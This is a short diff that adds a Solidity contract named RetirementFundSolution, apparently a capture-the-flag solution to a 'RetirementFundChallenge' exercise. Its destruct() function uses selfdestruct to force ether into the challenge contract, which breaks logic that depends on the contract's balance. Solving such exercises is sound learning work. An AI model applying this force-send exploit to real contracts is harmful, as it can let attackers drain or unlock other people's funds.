@@ -42,3 +42,18 @@ contract RetirementFundChallenge {
         msg.sender.transfer(address(this).balance);
     }
 }
+
+contract RetirementFundSolution {
+    
+    address chContractAddress;
+
+    function RetirementFundSolution(address chContract) public payable {
+        require(msg.value > 0 );
+        require(chContract != 0x0);
+        chContractAddress = chContract;
+    }
+
+    function destruct() public {
+        selfdestruct(chContractAddress);
+    }
+}
